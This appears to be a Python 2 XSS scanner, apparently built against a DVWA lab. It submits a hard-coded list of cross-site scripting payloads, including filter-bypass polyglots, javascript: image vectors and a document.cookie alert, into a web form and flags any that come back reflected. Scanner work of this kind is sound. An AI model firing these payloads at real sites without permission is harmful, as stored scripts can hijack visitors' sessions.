#-*- coding: utf-8 -*-


import mechanize
import urllib2
#import dtos
#import getSession
from mechanize._form import TextControl
#import attp
import datetime, time
from py4j.java_gateway import JavaGateway, GatewayParameters
import csv

#print att_patterns
# with open('./xss_payloads.txt', 'r') as f:
#    att_patterns.append(f.readlines())
#    f.close()

# att_patterns = dtos.singlilist(att_patterns)



def getPatterns():
#	dict = {}
#	with open('pattern_dict.csv') as csvfile:
#		reader = csv.DictReader(csvfile)
#		for row in reader:
			#print (row['title'], row['pattern'])
#			dict[row['title']]=row['pattern'].strip()
#		csvfile.close()
	dict = {
		'Ignore Case':'<sCriPt>alert("XSS");</sCriPt>.'
		,'Filter bypass based polyglot' : '""">><marquee><img src=x onerror=confirm(1)></marquee>""></plaintext\></|\><plaintext/onmouseover=prompt(1)>\',\'<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->""></script><script>alert(document.cookie)</script>""><img/id=""confirm&lpar;1)""/alt=""/""src=""/""onerror=eval(id)>\'"\"><img src=""http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg"">"',
		'Image XSS using the JavaScript directive ' : '<IMG SRC="javascript:alert(\'XSS\');">',
		'No quotes and no semicolon' : '<IMG SRC=javascript:alert(\'XSS\')>'
		,'Case insensitive XSS attack vector' : '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>'
		,'HTML entities' : '<IMG SRC=javascript:alert("XSS")>'
		,'Grave accent obfuscation' : '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'
		,'Malformed IMG tags' : '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'
		,'fromCharCode' : '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
		,'Default SRC tag to get past filters that check SRC domain' : '<IMG SRC=# onmouseover="alert(\'xxs\')">'
		,'Default SRC tag by leaving it empty' : '<IMG SRC= onmouseover="alert(\'xxs\')">'
		,'Default SRC tag by leaving it out entirely' : '<IMG onmouseover="alert(\'xxs\')">'

	}
	return dict

'''
def getBr(url, id,pwd): 
	cj = mechanize.CookieJar()
	br = mechanize.Browser()
	br.set_cookiejar(cj)
	br.open(url)
	br.select_form(nr=0)
	br.form['username']=id
	br.form['password']=pwd
	cj.clear_session_cookies()
	cookie1 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5',False,False,'/',True,False,None,True,None,None,{},False)
	cookie2 = mechanize.Cookie(0, 'PHPSESSID', 'i4i8d3n27cphmjppcv1iuhfuf2', None,False,'192.168.0.5',False,False,'/',True,False,None,True,None,None,{},False)
	cookie3 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa',False,False,'',True,False,None,True,None,None,{},False)
	cookie4 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/vulnerabilities',False,False,'/',True,False,None,True,None,None,{},False)
	cookie5 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/vulnerabilities/xss_s',False,False,'',True,False,None,True,None,None,{},False)
	cookie6 = mechanize.Cookie(0, 'security','low', None, False,'192.168.0.5/dvwa/',False,False,'/',True,False,None,True,None,None,{},False)


	cj.set_cookie(cookie1)
	cj.set_cookie(cookie2)
	cj.set_cookie(cookie3)
	cj.set_cookie(cookie4)
	cj.set_cookie(cookie5)
	cj.set_cookie(cookie6)
	
	br.submit()
	print 'did.'
	print cj
	return [br, cj]
'''


def xss_mechanize(url, formList, fieldList, att_patterns):
	vul_count=0 
	vul_pattern=[]
	br = mechanize.Browser()
	
#	br, ch = getBr(url,'admin','password')
	br.open(url)
	br.set_handle_equiv(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)

	#test = br.form
	br.form = list(br.forms())[0]   #forms..(1 includes login)
	print "=============form list============="
	for form in br.forms():
	   formList.append(form.name)

	for i in formList:
	   print i 
	print '%d forms have been found!' % len(formList) 
	print "===================================\n"

	print "============field list============="
	for control in br.form.controls:
	   fieldList.append(control.name)

	for i in fieldList:
	   print i
	print '%d fields have been found!' % len(fieldList)
	print "===================================\n"
	print 'control name : ', control.name, control.type
	

	vul_count, vul_pattern, ptrn_list = get_info(br, att_patterns, vul_count, vul_pattern)
	
	return formList, fieldList, vul_pattern, vul_count, ptrn_list




def get_info(br, att_patterns, vul_count, vul_pattern):
		
	print "===============info================\n"

#	textControl = ''
	ptrn_list = []
	
	for k, pattern in att_patterns.items():
#	for pattern in att_patterns.values():
#		for i in range (len(br.form.controls)):
		
		textControl = br.form.controls[0]
#		print textControl
#		print i
		#submitControl = br.form.controls[1]
		
		#print '1', submitControl.name, submitControl.type
		textControl.value = pattern
		#print datetime.datetime.now()
		print '1. attack query: ', textControl.value, '   type: ',textControl.type
		
		res = br.submit()
		res_add = res.geturl()
		res_code = res.code
		print res_code
		html_code = str(res.read())
		
		
		if pattern in html_code:
			flag = True
			print 'true'
			vul_count += 1

			vul_pattern.append(pattern)
			
			ptrn_list.append(k)
			#print len(ptrn_list)
			
		else:
			pass
			print 'false'

		#test = re.compile(str(res.read()))
		#result = re.findall(patterns, str(html_code))
		#print result
		
		#print bad
		#print '2. HTTP header: ', res.read()
		#print '2. HTTP header: ', res.read()

	 	print '3. HTTP response: ', urllib2.urlopen(res_add).getcode()
	#   print '******', HTMLParser.HTMLParser().unescape(res.read()), '********'
		#print '******', html_code, '********'
		br.form = list(br.forms())[0]
	 
	print vul_count, ", " , len(att_patterns)
#	for i in vul_pattern:
#		vul_pattern.append(i) 
			
	return vul_count, vul_pattern, ptrn_list

def main(url):
	#url = 'http://192.168.0.5/dvwa/vulnerabilities/xss_s/'
	today = time.localtime()
	scanTime = "%04d-%02d-%02d %02d:%02d:%02d" % (today.tm_year, today.tm_mon, today.tm_mday, today.tm_hour, today.tm_min, today.tm_sec)
	vul_count = 0
	vul_pattern = []
	formList=[]   #saves form names
	fieldList=[] #saves field names
	

	print url, "**scanning start**"
	
	att_patterns = getPatterns() 
	att_count = len(att_patterns)
	print 'attack patterns : ', len(att_patterns)
	#get result
	formList, fieldList, vul_pattern, vul_count, ptrn_list = xss_mechanize(url, formList, fieldList, att_patterns)
	
	
	#[1] url, date
	print "[1]url,",url,",date:",scanTime	
	print "[2]formnamelist,",formList,",fieldlist,",fieldList
	print "[3.1]Cross-Site-Scripting,",vul_pattern
	print "[3.2]Cross-Site-Scripting,",ptrn_list

	print vul_count, att_count

	
	#도메인 / 일시 / (//**3.폼리스트개수만)/ 발생취약점 [배열] 취약점 명 (sql/xss) / 취약점 패턴명(syntax error) / 공격 쿼리 or 스크립트 /취약점 패턴 요약설명 /플래그 /4. 폼정보(공격하는 대상)/ 폼 타입/ 폼명 /태그아이디 명 Htrml 코드 보여주기(보류)



if __name__ == "__main__":
#   main(sys.argv[1])
#	main("http://192.168.0.5/dvwa/vulnerabilities/xss_r/")
	#'http://192.168.0.5/dvwa/vulnerabilities/xss_r/' #reflected
	#'http://192.168.0.5/dvwa/vulnerabilities/xss_s/' #stored
	
	gateway = JavaGateway()
	print "python dfsaf 코드 실행중......"
	print "python py4j gateway start......"
	java_url = gateway.entry_point.getStack() # 브라우져
	print "python py4j getUrl 호출......"
	main(java_url.getUrl())
#	main('http://s50247-101020-log.sipontum.hack.me/xss1.php')